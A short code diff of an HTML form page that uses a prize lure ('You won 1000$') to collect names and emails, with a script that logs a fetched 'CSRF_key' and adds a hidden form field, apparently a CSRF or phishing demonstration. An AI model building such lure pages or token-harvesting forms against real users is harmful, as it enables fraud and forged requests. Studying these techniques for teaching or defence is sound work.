@@ -2,14 +2,14 @@
 <html>
 <head>
 <meta charset="ISO-8859-1">
-<title>Your charity</title>
+<title></title>
 </head>
 <body>
 
 <form name="myForm" action="HomeServlet" method="post">
-<h2>You won Audi S5!!!</h2>
+<h2>You won 1000$</h2>
 <br/>
-<p>Please enter your name and email to transfer $1000 to charity</p>
+<p>Enter your name and email to transfer $1000$</p>
 <br/>
 name : <input type="text" name="name"/>
 email : <input type="text" name="email"/>
@@ -21,7 +21,7 @@ email : <input type="text" name="email"/>
 <script type="text/javascript">
 function callAjax(url, callback){
     var xmlhttp;
-    // compatible with IE7+, Firefox, Chrome, Opera, Safari
+    
     xmlhttp = new XMLHttpRequest();
     xmlhttp.responseType = 'json';
     xmlhttp.onreadystatechange = function(){
@@ -37,7 +37,7 @@ function myCallback(resp){
 	console.log(resp["CSRF_key"]);
 	
 	var form = document.forms['myForm'];
-	   // form.action = 'put your url here';
+	 
 	   var el = document.createElement("input");
 	   el.type = "hidden";
 	   el.name = "myHiddenField";
